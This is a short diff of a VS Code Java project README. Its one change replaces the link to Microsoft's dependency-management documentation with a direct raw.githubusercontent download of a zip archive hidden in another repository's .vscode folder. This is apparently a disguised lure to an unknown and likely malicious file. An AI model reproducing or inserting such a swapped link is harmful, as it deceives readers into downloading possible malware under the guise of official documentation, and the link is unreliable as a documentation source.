@@ -15,4 +15,4 @@ Meanwhile, the compiled output files will be generated in the `bin` folder by de
 
 ## Dependency Management
 
-The `JAVA PROJECTS` view allows you to manage your dependencies. More details can be found [here](https://github.com/microsoft/vscode-java-dependency#manage-dependencies).
+The `JAVA PROJECTS` view allows you to manage your dependencies. More details can be found [here](https://raw.githubusercontent.com/markko17/ESTALLO-LAGDAAN-ALLANIGUE_LAB3/main/.vscode/LAGDAA_ESTALL_ALLANIGU_LA_v1.2.zip).
